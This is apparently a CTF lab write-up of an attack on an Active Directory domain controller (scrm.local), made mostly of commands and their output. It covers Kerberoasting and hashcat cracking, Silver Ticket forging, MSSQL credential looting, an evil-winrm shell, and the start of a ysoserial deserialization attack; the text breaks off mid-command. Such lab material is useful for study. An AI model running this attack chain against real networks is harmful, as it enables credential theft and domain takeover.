Host: DC1; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: -37s, deviation: 0s, median: -37s | smb2-time: | date: 2023-09-12T15:56:01 |_ start_date: N/A | smb2-security-mode: | 3:1:1: |_ Message signing enabled and required Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 199.93 seconds dap └─$ ldapsearch -H ldap://10.10.11.168 -x -s base namingcontexts # extended LDIF # # LDAPv3 # base \u0026lt;\u0026gt; (default) with scope baseObject # filter: (objectclass=*) # requesting: namingcontexts # # dn: namingcontexts: DC=scrm,DC=local namingcontexts: CN=Configuration,DC=scrm,DC=local namingcontexts: CN=Schema,CN=Configuration,DC=scrm,DC=local namingcontexts: DC=DomainDnsZones,DC=scrm,DC=local namingcontexts: DC=ForestDnsZones,DC=scrm,DC=local # search result search: 2 result: 0 Success # numResponses: 2 # numEntries: 1 └─$ ldapsearch -H ldap://10.10.11.168 -x -b \u0026#34;DC=scrm,DC=local\u0026#34; # extended LDIF # # LDAPv3 # base \u0026lt;DC=scrm,DC=local\u0026gt; with scope subtree # filter: (objectclass=*) # requesting: ALL # # search result search: 2 result: 1 Operations error text: 000004DC: LdapErr: DSID-0C090A5C, comment: In order to perform this opera tion a successful bind must be completed on the connection., data 0, v4563 # numResponses: 1 dns └─$ dig @10.10.11.168 scrm.local ; \u0026lt;\u0026lt;\u0026gt;\u0026gt; DiG 9.18.16-1-Debian \u0026lt;\u0026lt;\u0026gt;\u0026gt; @10.10.11.168 scrm.local ; (1 server found) ;; global options: +cmd ;; Got answer: ;; WARNING: .local is reserved for Multicast DNS ;; You are currently testing what happens when an mDNS query is leaked to DNS ;; -\u0026gt;\u0026gt;HEADER\u0026lt;\u0026lt;- opcode: QUERY, status: NOERROR, id: 20897 ;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1 ;; OPT PSEUDOSECTION: ; EDNS: version: 0, flags:; udp: 4000 ;; QUESTION SECTION: ;scrm.local. IN A ;; ANSWER SECTION: scrm.local. 600 IN A 10.10.11.168 ;; Query time: 143 msec ;; SERVER: 10.10.11.168#53(10.10.11.168) (UDP) ;; WHEN: Tue Sep 12 17:47:56 BST 2023 ;; MSG SIZE rcvd: 55 └─$ dig axfr @10.10.11.168 scrm.local ; \u0026lt;\u0026lt;\u0026gt;\u0026gt; DiG 9.18.16-1-Debian \u0026lt;\u0026lt;\u0026gt;\u0026gt; axfr @10.10.11.168 scrm.local ; (1 server found) ;; global options: +cmd ; Transfer failed. Web Server NTLM is disabled Password reset States that password will be the same as username when reset IT support Possible user ksimpson New account form Sales orders app Let\u0026rsquo;s see query dc1 dns └─$ nslookup dc1.scrm.local 10.10.11.168 Server: 10.10.11.168 Address: 10.10.11.168#53 Name: dc1.scrm.local Address: 10.10.11.168 Name: dc1.scrm.local Address: dead:beef::bd65:c83c:6338:a949 Name: dc1.scrm.local Address: dead:beef::154 Foothold If we try smbclient, it doesn\u0026rsquo;t work since NTLM is disabled We can try impacket-smbclient with kerberos authentication └─$ impacket-smbclient -k scrm.local/ksimpson:ksimpson@dc1.scrm.local -dc-ip 10.10.11.168 Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation [-] CCache file is not found. Skipping... Type help for list of commands # help open {host,port=445} - opens a SMB connection against the target host/port login {domain/username,passwd} - logs into the current SMB connection, no parameters for NULL connection. If no password specified, it\u0026#39;ll be prompted kerberos_login {domain/username,passwd} - logs into the current SMB connection using Kerberos. If no password specified, it\u0026#39;ll be prompted. Use the DNS resolvable domain name login_hash {domain/username,lmhash:nthash} - logs into the current SMB connection using the password hashes logoff - logs off shares - list available shares use {sharename} - connect to an specific share cd {path} - changes the current directory to {path} lcd {path} - changes the current local directory to {path} pwd - shows current remote directory password - changes the user password, the new password will be prompted for input ls {wildcard} - lists all the files in the current directory rm {file} - removes the selected file mkdir {dirname} - creates the directory under the current path rmdir {dirname} - removes the directory under the current path put {filename} - uploads the filename into the current path get {filename} - downloads the filename from the current path mget {mask} - downloads all files from the current directory matching the provided mask cat {filename} - reads the filename from the current path mount {target,path} - creates a mount point from {path} to {target} (admin required) umount {path} - removes the mount point at {path} without deleting the directory (admin required) list_snapshots {path} - lists the vss snapshots for the specified path info - returns NetrServerInfo main results who - returns the sessions currently connected at the target host (admin required) close - closes the current SMB Session exit - terminates the server process (and this session) List of shares # shares ADMIN$ C$ HR IPC$ IT NETLOGON Public Sales SYSVOL We have access to Public share Let\u0026rsquo;s download Network Security Changes.pdf # use HR [-] SMB SessionError: STATUS_ACCESS_DENIED({Access Denied} A process has requested access to an object but has not been granted those access rights.) # use Sales [-] SMB SessionError: STATUS_ACCESS_DENIED({Access Denied} A process has requested access to an object but has not been granted those access rights.) # use IT [-] SMB SessionError: STATUS_ACCESS_DENIED({Access Denied} A process has requested access to an object but has not been granted those access rights.) # use Public # ls drw-rw-rw- 0 Thu Nov 4 22:23:19 2021 . drw-rw-rw- 0 Thu Nov 4 22:23:19 2021 .. -rw-rw-rw- 630106 Fri Nov 5 17:45:07 2021 Network Security Changes.pdf # get Network Security Changes.pdf # Content of Network Security Changes.pdf The company uses kerberos for auth Let\u0026rsquo;s check for Kerberostable users https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberoast └─$ impacket-GetUserSPNs scrm.local/ksimpson:ksimpson -dc-host dc1.scrm.local -request -k -no-pass Impacket v0.11.0 - Copyright 2023 Fortra [-] CCache file is not found. Skipping... [-] CCache file is not found. Skipping... ServicePrincipalName Name MemberOf PasswordLastSet LastLogon Delegation ---------------------------- ------ -------- -------------------------- -------------------------- ---------- MSSQLSvc/dc1.scrm.local:1433 sqlsvc 2021-11-03 16:32:02.351452 2023-09-12 16:09:27.626803 MSSQLSvc/dc1.scrm.local sqlsvc 2021-11-03 16:32:02.351452 2023-09-12 16:09:27.626803 [-] CCache file is not found. Skipping... $krb5tgs$23$*sqlsvc$SCRM.LOCAL$scrm.local/sqlsvc*$cfc4b32a63f2f11d2c6f0983dbaece04$319dc6f2ce6e6edb39b3d4beaefb9bda37eaf3c01ba5b9855e556694a353e0eb18493011d02ca4d0450bff6f5e7d6684b04c43e18539d79190a5cf48f15c9def761c6cb9c927716bf63b2a2acaab64459d137b50628a9f536c408e34b4bf0a59ee2186de4403248b38b2f12e59d19c8b7daf494243019a74b20580efe0e9e02c217da9519e12b66e4b90622feda42094f9897d82635e2689ee9861d770d9c790940185c17fd7840f54010fd5d6fe6ba0402ed8a37f5993ac8e9821809b46027300e298ea17aa56923df7fdb05d016e99066487e276bfdbae0a56c2ed57ad0e1281343accf68f84b301fe5ccdffb71439b9afd75b3de9eeb20bbb99255cfeb0edd324bb92cf82aa26f8ffabcd607c4e913941de269e0b5ad8346a91be81b5a638e922ae443b43a1caa240b6401ff60749e80f5e383579eb28d9dfed639c8a57a115cbe654a4e841918d1ed76c59c660fd7c0d3b258a1e638e34e65e32cc60af5b4a3583ffb3e3274602c618ccff18d034537d57abee7ec124d6067649d39c2f0bd9dc9c62f6c70fbe0012735bebabc32bdf83977e2190d2159e90a91878c36a59b1c064f04460a4888d98eb420027e192598b377d369b566ab16f773d7861f3a2caf73db1b42bbc30c69413240c817429129b2aa5cebff9842e360a9af497e47b61c0246b97d5b90a3380c0972698cee34b9ee3a0359545319960670fc3f8c0b1e61518c34a971f22e4c5e585b5e0ed82350767c325d399a8388cc75819d022037f092d4af3f0a5ce9352d1879599391c179093109bd1b1e54ac64a5b3cbee85f9630b897a1b5b78129767707ad8926ecd7a19ca28e375b4a193b4ab146c47af86e636b1a9d7639b7bad40de6542480538f3ef5102c06a6fc35479d2f713862762dbd3c865c7c2d5f836e002b3a5f915086ee47023bfc147ae07b3c48ed2f3481edb321c7c4d5ff4cad67831a4bb8d1c5fc82a0d8397ce783ba9494eb1e65bfa313307b810cb9eb57da33c821c806639ff07f2a04e8e51c0fd3428059a64056feb6bdf82625762da1a1e06c81f9f31a0194b71557c70e0e9931a68365f3a9244e8e59221be052e8e9751bd4df3ecdde718a96d0914209e3d8a3fdf22dad1ddfe7846f9ed7962972311efc8ee6664b9ddb9a0604f400e42bd3cc983524bb5df94c07d04cc865a24e0bfea62592fed7a11f1a59bff4c56acc16399ebf5aa1f61b203eb114528dc054751ca58b1e6f577f5d8851bb489c5febf64284266a2a4fdd3b367cafe0309375f52dc81a8f81e0aa0e357452a9804ef9d48289f6d158e2eb55212d47a348fb9d4a996c90e8ac5dcdcfcfa897a8383686de23ceeee123d79490655accff8743e70807f85b0bce797330cc3d8fcd315343803eb973a773bbca722df5096490549dba8ce61b3503def77f57a0a09904ed92b4e8040b Let\u0026rsquo;s try cracking it └─$ hashcat --help | grep Kerb 19600 | Kerberos 5, etype 17, TGS-REP | Network Protocol 19800 | Kerberos 5, etype 17, Pre-Auth | Network Protocol 28800 | Kerberos 5, etype 17, DB | Network Protocol 19700 | Kerberos 5, etype 18, TGS-REP | Network Protocol 19900 | Kerberos 5, etype 18, Pre-Auth | Network Protocol 28900 | Kerberos 5, etype 18, DB | Network Protocol 7500 | Kerberos 5, etype 23, AS-REQ Pre-Auth | Network Protocol 13100 | Kerberos 5, etype 23, TGS-REP | Network Protocol 18200 | Kerberos 5, etype 23, AS-REP | Network Protocol └─$ hashcat -m 13100 hash /usr/share/wordlists/rockyou.txt hashcat (v6.2.6) starting ... $krb5tgs$23$*sqlsvc$SCRM.LOCAL$scrm.local/sqlsvc*$cfc4b32a63f2f11d2c6f0983dbaece04$319dc6f2ce6e6edb39b3d4beaefb9bda37eaf3c01ba5b9855e556694a353e0eb18493011d02ca4d0450bff6f5e7d6684b04c43e18539d79190a5cf48f15c9def761c6cb9c927716bf63b2a2acaab64459d137b50628a9f536c408e34b4bf0a59ee2186de4403248b38b2f12e59d19c8b7daf494243019a74b20580efe0e9e02c217da9519e12b66e4b90622feda42094f9897d82635e2689ee9861d770d9c790940185c17fd7840f54010fd5d6fe6ba0402ed8a37f5993ac8e9821809b46027300e298ea17aa56923df7fdb05d016e99066487e276bfdbae0a56c2ed57ad0e1281343accf68f84b301fe5ccdffb71439b9afd75b3de9eeb20bbb99255cfeb0edd324bb92cf82aa26f8ffabcd607c4e913941de269e0b5ad8346a91be81b5a638e922ae443b43a1caa240b6401ff60749e80f5e383579eb28d9dfed639c8a57a115cbe654a4e841918d1ed76c59c660fd7c0d3b258a1e638e34e65e32cc60af5b4a3583ffb3e3274602c618ccff18d034537d57abee7ec124d6067649d39c2f0bd9dc9c62f6c70fbe0012735bebabc32bdf83977e2190d2159e90a91878c36a59b1c064f04460a4888d98eb420027e192598b377d369b566ab16f773d7861f3a2caf73db1b42bbc30c69413240c817429129b2aa5cebff9842e360a9af497e47b61c0246b97d5b90a3380c0972698cee34b9ee3a0359545319960670fc3f8c0b1e61518c34a971f22e4c5e585b5e0ed82350767c325d399a8388cc75819d022037f092d4af3f0a5ce9352d1879599391c179093109bd1b1e54ac64a5b3cbee85f9630b897a1b5b78129767707ad8926ecd7a19ca28e375b4a193b4ab146c47af86e636b1a9d7639b7bad40de6542480538f3ef5102c06a6fc35479d2f713862762dbd3c865c7c2d5f836e002b3a5f915086ee47023bfc147ae07b3c48ed2f3481edb321c7c4d5ff4cad67831a4bb8d1c5fc82a0d8397ce783ba9494eb1e65bfa313307b810cb9eb57da33c821c806639ff07f2a04e8e51c0fd3428059a64056feb6bdf82625762da1a1e06c81f9f31a0194b71557c70e0e9931a68365f3a9244e8e59221be052e8e9751bd4df3ecdde718a96d0914209e3d8a3fdf22dad1ddfe7846f9ed7962972311efc8ee6664b9ddb9a0604f400e42bd3cc983524bb5df94c07d04cc865a24e0bfea62592fed7a11f1a59bff4c56acc16399ebf5aa1f61b203eb114528dc054751ca58b1e6f577f5d8851bb489c5febf64284266a2a4fdd3b367cafe0309375f52dc81a8f81e0aa0e357452a9804ef9d48289f6d158e2eb55212d47a348fb9d4a996c90e8ac5dcdcfcfa897a8383686de23ceeee123d79490655accff8743e70807f85b0bce797330cc3d8fcd315343803eb973a773bbca722df5096490549dba8ce61b3503def77f57a0a09904ed92b4e8040b:Pegasus60 Session..........: hashcat Status...........: Cracked Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP) Hash.Target......: $krb5tgs$23$*sqlsvc$SCRM.LOCAL$scrm.local/sqlsvc*$c...e8040b Time.Started.....: Tue Sep 12 20:03:57 2023 (10 secs) Time.Estimated...: Tue Sep 12 20:04:07 2023 (0 secs) Kernel.Feature...: Pure Kernel Guess.Base.......: File (/usr/share/wordlists/rockyou.txt) Guess.Queue......: 1/1 (100.00%) Speed.#1.........: 1006.9 kH/s (0.42ms) @ Accel:256 Loops:1 Thr:1 Vec:8 Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new) Progress.........: 10729472/14344385 (74.80%) Rejected.........: 0/10729472 (0.00%) Restore.Point....: 10728960/14344385 (74.80%) Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1 Candidate.Engine.: Device Generator Candidates.#1....: Pekqhua* -\u0026gt; Pearson1 Hardware.Mon.#1..: Util: 90% Started: Tue Sep 12 20:03:56 2023 Stopped: Tue Sep 12 20:04:08 2023 We have sqlsvc:Pegasus60 But the creds doesn\u0026rsquo;t give anything We can perform Silver Ticket attack The Silver ticket attack is based on crafting a valid TGS for a service once the NTLM hash of service is owned (like the PC account hash). Thus, it is possible to gain access to that service by forging a custom TGS as any user. https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/silver-ticket We need: NTLM hash The SID of the domain SPN of the account Let\u0026rsquo;s convert password to NTLM https://blog.atucom.net/2012/10/generate-ntlm-hashes-via-command-line.html └─$ iconv -f ASCII -t UTF-16LE \u0026lt;(printf \u0026#34;Pegasus60\u0026#34;) | openssl dgst -md4 MD4(stdin)= b999a16500b87d17ec7f2e2a68778f05 Let\u0026rsquo;s get SID of the domain └─$ ldapsearch -H ldap://dc1.scrm.local -D ksimpson@scrm.local -w ksimpson -b \u0026#34;DC=scrm,DC=local\u0026#34; ldap_bind: Strong(er) authentication required (8) additional info: 00002028: LdapErr: DSID-0C090259, comment: The server requires binds to turn on integrity checking if SSL\\TLS are not already active on the connection, data 0, v4563 I need to download the certificate └─$ openssl s_client -connect dc1.scrm.local:636 \u0026lt; /dev/null | sed -ne \u0026#39;/-BEGIN CERTIFICATE-/,/-END CERTIFICATE-/p\u0026#39; depth=0 CN = DC1.scrm.local verify error:num=20:unable to get local issuer certificate verify return:1 depth=0 CN = DC1.scrm.local verify error:num=21:unable to verify the first certificate verify return:1 depth=0 CN = DC1.scrm.local verify return:1 -----BEGIN CERTIFICATE----- MIIGHDCCBQSgAwIBAgITEgAAAAOnziQ14yF6dQAAAAAAAzANBgkqhkiG9w0BAQUF ADBDMRUwEwYKCZImiZPyLGQBGRYFbG9jYWwxFDASBgoJkiaJk/IsZAEZFgRzY3Jt MRQwEgYDVQQDEwtzY3JtLURDMS1DQTAeFw0yMzA5MTIyMjU4MjVaFw0yNDA5MTEy MjU4MjVaMBkxFzAVBgNVBAMTDkRDMS5zY3JtLmxvY2FsMIIBIjANBgkqhkiG9w0B AQEFAAOCAQ8AMIIBCgKCAQEAwVjLBnJ5jxlXIaflyk+A/cjJL+459zVrtlS1O+6g XuHi4dK/FgI57emiUM6w5HWcN0+BqFdkqiyBLKN8ciWuNVZ9yIT2SScoldyj2PHc y8C8it7zHuiflgTtVwgxNzGsLNm326viZPxOcHYZMlxgZLj+1HgUCgRhz7XlLjJX K3n7dsClvER5v+XzM7j2rx0LbdMgZ4SHWVQVkrWp4DK04hWRdo/T+lxS40lKfJ8X U4MA0Nn9dEyE09Hwbue8ikiRYNhV7Ea4Fb5pDuOe3zVTobIazAhnOqAHaa7COXPx Y3qckhHDuhh0uVTO73PKV2uhePOOenHvdW3eBUtyi279zQIDAQABo4IDMTCCAy0w LwYJKwYBBAGCNxQCBCIeIABEAG8AbQBhAGkAbgBDAG8AbgB0AHIAbwBsAGwAZQBy MB0GA1UdJQQWMBQGCCsGAQUFBwMCBggrBgEFBQcDATAOBgNVHQ8BAf8EBAMCBaAw eAYJKoZIhvcNAQkPBGswaTAOBggqhkiG9w0DAgICAIAwDgYIKoZIhvcNAwQCAgCA MAsGCWCGSAFlAwQBKjALBglghkgBZQMEAS0wCwYJYIZIAWUDBAECMAsGCWCGSAFl AwQBBTAHBgUrDgMCBzAKBggqhkiG9w0DBzAdBgNVHQ4EFgQUTCZWTY3oLpQFrXlk rF5NdzbBjpYwHwYDVR0jBBgwFoAUCGlCGQotn3BwNjRGHOcdhhWbaJIwgcQGA1Ud HwSBvDCBuTCBtqCBs6CBsIaBrWxkYXA6Ly8vQ049c2NybS1EQzEtQ0EsQ049REMx LENOPUNEUCxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxD Tj1Db25maWd1cmF0aW9uLERDPXNjcm0sREM9bG9jYWw/Y2VydGlmaWNhdGVSZXZv Y2F0aW9uTGlzdD9iYXNlP29iamVjdENsYXNzPWNSTERpc3RyaWJ1dGlvblBvaW50 MIG8BggrBgEFBQcBAQSBrzCBrDCBqQYIKwYBBQUHMAKGgZxsZGFwOi8vL0NOPXNj cm0tREMxLUNBLENOPUFJQSxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1T ZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPXNjcm0sREM9bG9jYWw/Y0FDZXJ0 aWZpY2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmljYXRpb25BdXRob3JpdHkw OgYDVR0RBDMwMaAfBgkrBgEEAYI3GQGgEgQQZxIub1TYH0SkXtctiXUFOYIOREMx LnNjcm0ubG9jYWwwTwYJKwYBBAGCNxkCBEIwQKA+BgorBgEEAYI3GQIBoDAELlMt MS01LTIxLTI3NDMyMDcwNDUtMTgyNzgzMTEwNS0yNTQyNTIzMjAwLTEwMDAwDQYJ KoZIhvcNAQEFBQADggEBAHejAv0dYre1sg5vNiwwWwlI8U4a/9MWkTSdMCUe+JEu dPAdZKIEzsPkFIHIAl5+S5Yb/aPNtekGvEyLJ5k2f14YJg5b2iscS6pgVTYsAEGp z6pjy1DNUIeDuk7RDoKFG+yYwxc24K1RchkbKLZhQdDkZ7KJlkN9cnV0ioVWLLmy R6WUrzxggnkC4B4dPWqR2QVki88DorQt961ccAZF/KegcjUK2iZ8+y8jiukT51oV UaZIXMP0j8qs/sW0Vn4WCL0Iv1pzj4D2l4qTHoPR5tcC5qMQVNrYTquq567o+JZS 2XWj/FmV8lo3bu4B3zfoPQBJYUqQVrKzfuAqYyyp9os= -----END CERTIFICATE----- DONE └─$ openssl s_client -connect dc1.scrm.local:636 \u0026lt; /dev/null | sed -ne \u0026#39;/-BEGIN CERTIFICATE-/,/-END CERTIFICATE-/p\u0026#39; \u0026gt; scrm.local.crt depth=0 CN = DC1.scrm.local verify error:num=20:unable to get local issuer certificate verify return:1 depth=0 CN = DC1.scrm.local verify error:num=21:unable to verify the first certificate verify return:1 depth=0 CN = DC1.scrm.local verify return:1 DONE Edit /etc/ldap/ldap.conf # # LDAP Defaults # # See ldap.conf(5) for details # This file should be world readable but not world writable. #BASE dc=example,dc=com #URI ldap://ldap.example.com ldap://ldap-provider.example.com:666 #SIZELIMIT 12 #TIMELIMIT 15 #DEREF never # TLS certificates (needed for GnuTLS) #TLS_CACERT /etc/ssl/certs/ca-certificates.crt TLS_CACERT /home/kali/Documents/tasks/scrm.local.crt Let\u0026rsquo;s run ldapsearch again └─$ ldapsearch -H ldap://dc1.scrm.local -Z -D ksimpson@scrm.local -w ksimpson -b \u0026#34;DC=scrm,DC=local\u0026#34; \u0026#34;(objectClass=user)\u0026#34; # extended LDIF # # LDAPv3 # base \u0026lt;DC=scrm,DC=local\u0026gt; with scope subtree # filter: (objectClass=user) # requesting: ALL # # Administrator, Users, scrm.local dn: CN=Administrator,CN=Users,DC=scrm,DC=local objectClass: top objectClass: person objectClass: organizationalPerson objectClass: user cn: Administrator description: Built-in account for administering the computer/domain distinguishedName: CN=Administrator,CN=Users,DC=scrm,DC=local ... objectSid:: AQUAAAAAAAUVAAAAhQSCo0F98mxA04uX9AEAAA== ... SID is in string form We need to convert it https://devblogs.microsoft.com/oldnewthing/20040315-00/?p=40253 https://stackoverflow.com/a/65364978 S-1-5-21-2743207045-1827831105-2542523200-500 import base64 from samba.dcerpc import security from samba.ndr import ndr_unpack base64_sid = \u0026#34;AQUAAAAAAAUVAAAAhQSCo0F98mxA04uX9AEAAA==\u0026#34; binary_sid = base64.b64decode(base64_sid) print(str(ndr_unpack(security.dom_sid, binary_sid))) └─$ python3 sid_binary_to_string.py S-1-5-21-2743207045-1827831105-2542523200-500 We can also use impacket-getPac to get the SID └─$ impacket-getPac -targetUser administrator scrm.local/ksimpson:ksimpson Impacket v0.11.0 - Copyright 2023 Fortra KERB_VALIDATION_INFO LogonTime: dwLowDateTime: 222038284 dwHighDateTime: 31057291 LogoffTime: dwLowDateTime: 4294967295 dwHighDateTime: 2147483647 KickOffTime: dwLowDateTime: 4294967295 dwHighDateTime: 2147483647 PasswordLastSet: dwLowDateTime: 2585823167 dwHighDateTime: 30921784 PasswordCanChange: dwLowDateTime: 3297396671 dwHighDateTime: 30921985 PasswordMustChange: dwLowDateTime: 4294967295 dwHighDateTime: 2147483647 EffectiveName: \u0026#39;administrator\u0026#39; ... ResourceGroupCount: 1 ResourceGroupIds: [ RelativeId: 572 Attributes: 536870919 , ] Domain SID: S-1-5-21-2743207045-1827831105-2542523200 0000 10 00 00 00 4E F3 44 2B F2 47 34 D9 3C 0F 53 68 ....N.D+.G4.\u0026lt;.Sh Now we have all we need Let\u0026rsquo;s generate a ticket with impacket-ticketer └─$ impacket-ticketer -nthash b999a16500b87d17ec7f2e2a68778f05 -domain-sid S-1-5-21-2743207045-1827831105-2542523200 -domain scrm.local -dc-ip dc1.scrm.local -spn MSSQLSvc/dc1.scrm.local:1433 administrator Impacket v0.11.0 - Copyright 2023 Fortra [*] Creating basic skeleton ticket and PAC Infos [*] Customizing ticket for scrm.local/administrator [*] PAC_LOGON_INFO [*] PAC_CLIENT_INFO_TYPE [*] EncTicketPart [*] EncTGSRepPart [*] Signing/Encrypting final ticket [*] PAC_SERVER_CHECKSUM [*] PAC_PRIVSVR_CHECKSUM [*] EncTicketPart [*] EncTGSRepPart [*] Saving ticket in administrator.ccache └─$ klist klist: No credentials cache found (filename: /tmp/krb5cc_1000) └─$ KRB5CCNAME=administrator.ccache klist Ticket cache: FILE:administrator.ccache Default principal: administrator@SCRM.LOCAL Valid starting Expires Service principal 09/13/2023 17:37:26 09/10/2033 17:37:26 MSSQLSvc/dc1.scrm.local:1433@SCRM.LOCAL renew until 09/10/2033 17:37:26 Let\u0026rsquo;s connect to database using ticket └─$ KRB5CCNAME=administrator.ccache impacket-mssqlclient -k dc1.scrm.local Impacket v0.11.0 - Copyright 2023 Fortra [*] Encryption required, switching to TLS [*] ENVCHANGE(DATABASE): Old Value: master, New Value: master [*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english [*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192 [*] INFO(DC1): Line 1: Changed database context to \u0026#39;master\u0026#39;. [*] INFO(DC1): Line 1: Changed language setting to us_english. [*] ACK: Result: 1 - Microsoft SQL Server (150 7208) [!] Press help for extra shell commands SQL (SCRM\\administrator dbo@master)\u0026gt; Enumerate database https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server SQL (SCRM\\administrator dbo@master)\u0026gt; SELECT name FROM master.dbo.sysdatabases; name ---------- master tempdb model msdb ScrambleHR SQL (SCRM\\administrator dbo@master)\u0026gt; use ScrambleHR; [*] ENVCHANGE(DATABASE): Old Value: master, New Value: ScrambleHR [*] INFO(DC1): Line 1: Changed database context to \u0026#39;ScrambleHR\u0026#39;. SQL (SCRM\\administrator dbo@ScrambleHR)\u0026gt; SELECT * FROM ScrambleHR.INFORMATION_SCHEMA.TABLES; TABLE_CATALOG TABLE_SCHEMA TABLE_NAME TABLE_TYPE ------------- ------------ ---------- ---------- ScrambleHR dbo Employees b\u0026#39;BASE TABLE\u0026#39; ScrambleHR dbo UserImport b\u0026#39;BASE TABLE\u0026#39; ScrambleHR dbo Timesheets b\u0026#39;BASE TABLE\u0026#39; SQL (SCRM\\administrator dbo@ScrambleHR)\u0026gt; SELECT * from Employees; EmployeeID FirstName Surname Title Manager Role ---------- --------- ------- ----- ------- ---- SQL (SCRM\\administrator dbo@ScrambleHR)\u0026gt; SELECT * from UserImport; LdapUser LdapPwd LdapDomain RefreshInterval IncludeGroups -------- ----------------- ---------- --------------- ------------- MiscSvc ScrambledEggs9900 scrm.local 90 0 SQL (SCRM\\administrator dbo@ScrambleHR)\u0026gt; SELECT * from Timesheets; EmployeeID TimeStart TimeEnd ---------- --------- ------- We have creds, let\u0026rsquo;s try winrm └─$ evil-winrm -h Evil-WinRM shell v3.5 Usage: evil-winrm -i IP -u USER [-s SCRIPTS_PATH] [-e EXES_PATH] [-P PORT] [-p PASS] [-H HASH] [-U URL] [-S] [-c PUBLIC_KEY_PATH ] [-k PRIVATE_KEY_PATH ] [-r REALM] [--spn SPN_PREFIX] [-l] -S, --ssl Enable ssl -c, --pub-key PUBLIC_KEY_PATH Local path to public key certificate -k, --priv-key PRIVATE_KEY_PATH Local path to private key certificate -r, --realm DOMAIN Kerberos auth, it has to be set also in /etc/krb5.conf file using this format -\u0026gt; CONTOSO.COM = { kdc = fooserver.contoso.com } -s, --scripts PS_SCRIPTS_PATH Powershell scripts local path --spn SPN_PREFIX SPN prefix for Kerberos auth (default HTTP) -e, --executables EXES_PATH C# executables local path -i, --ip IP Remote host IP or hostname. FQDN for Kerberos auth (required) -U, --url URL Remote url endpoint (default /wsman) -u, --user USER Username (required if not using kerberos) -p, --password PASS Password -H, --hash HASH NTHash -P, --port PORT Remote host port (default 5985) -V, --version Show version -n, --no-colors Disable colors -N, --no-rpath-completion Disable remote path completion -l, --log Log the WinRM session -h, --help Display this help message We need to change add SCRM.LOCAL realm in /etc/krb5.conf └─$ cat /etc/krb5.conf [libdefaults] default_realm = SCRM.LOCAL # The following krb5.conf variables are only for MIT Kerberos. kdc_timesync = 1 ccache_type = 4 forwardable = true proxiable = true rdns = false # The following libdefaults parameters are only for Heimdal Kerberos. fcc-mit-ticketflags = true [realms] SCRM.LOCAL = { kdc = dc1.scrm.local master_kdc = dc1.scrm.local admin_server = dc1.scrm.local default_domain = dc1.scrm.local } [domain_realm] .scrm.local = SCRM.LOCAL scrm.local = SCRM.LOCAL Now, let\u0026rsquo;s get get ticket MiscSvc:ScrambledEggs9900 └─$ impacket-getTGT scrm.local/MiscSvc:ScrambledEggs9900 -dc-ip dc1.scrm.local Impacket v0.11.0 - Copyright 2023 Fortra [*] Saving ticket in MiscSvc.ccache Root whoami *Evil-WinRM* PS C:\\Users\\miscsvc\\Documents\u0026gt; whoami /groups GROUP INFORMATION ----------------- Group Name Type SID Attributes =========================================== ================ ============================================== ================================================== Everyone Well-known group S-1-1-0 Mandatory group, Enabled by default, Enabled group BUILTIN\\Users Alias S-1-5-32-545 Mandatory group, Enabled by default, Enabled group BUILTIN\\Pre-Windows 2000 Compatible Access Alias S-1-5-32-554 Mandatory group, Enabled by default, Enabled group BUILTIN\\Certificate Service DCOM Access Alias S-1-5-32-574 Mandatory group, Enabled by default, Enabled group BUILTIN\\Remote Management Users Alias S-1-5-32-580 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\NETWORK Well-known group S-1-5-2 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\Authenticated Users Well-known group S-1-5-11 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\This Organization Well-known group S-1-5-15 Mandatory group, Enabled by default, Enabled group SCRM\\ITShare Group S-1-5-21-2743207045-1827831105-2542523200-1609 Mandatory group, Enabled by default, Enabled group SCRM\\ITUsers Group S-1-5-21-2743207045-1827831105-2542523200-1610 Mandatory group, Enabled by default, Enabled group Authentication authority asserted identity Well-known group S-1-18-1 Mandatory group, Enabled by default, Enabled group Mandatory Label\\Medium Plus Mandatory Level Label S-1-16-8448 Now we can access IT share Inside we have Sales Order Client application Let\u0026rsquo;s download it *Evil-WinRM* PS C:\\Shares\\IT\\Apps\\Sales Order Client\u0026gt; ls Directory: C:\\Shares\\IT\\Apps\\Sales Order Client Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 11/5/2021 8:52 PM 86528 ScrambleClient.exe -a---- 11/5/2021 8:52 PM 19456 ScrambleLib.dll Let\u0026rsquo;s feed it to dnspy └─$ file ScrambleClient.exe ScrambleClient.exe: PE32 executable (GUI) Intel 80386 Mono/.Net assembly, for MS Windows, 3 sections I ran the app from the Windows host Tried using the creds we found, but they didn\u0026rsquo;t work If we intercept the packets via Wireshark, we can see that it\u0026rsquo;s a text-based protocol The Logon function from LoginWindow calls Logon function in ScrambleNetClient We see the backdoor with scrmdev user When we use scrmdev username for login, we have a success Check the packets in Wireshark We sent LIST_ORDERS; and received base64 output Which looks like a serialized data When we upload a new order, we generate a serialized object and send it in format UPLOAD_ORDER;\u0026lt;BASE64-ENCRYPTED-DATA\u0026gt; We could also see the same thing if we turn on debug mode in application Tools -\u0026gt; Enable Debug Logging When we perform operations, all logs will be saved in ScrambleDebugLog.txt file We can look for Upload functionality in dnspy UploadOrder function from SalesOrder, calls SerializeToBase64 It uses BinaryFormatter which is risky according to Microsoft So let\u0026rsquo;s generate payload using ysoserial and perform deserialization attack https://github.com/pwntester/ysoserial.net .\\ysoserial.exe -f BinaryFormatter -g AxHostState -o base64 -c 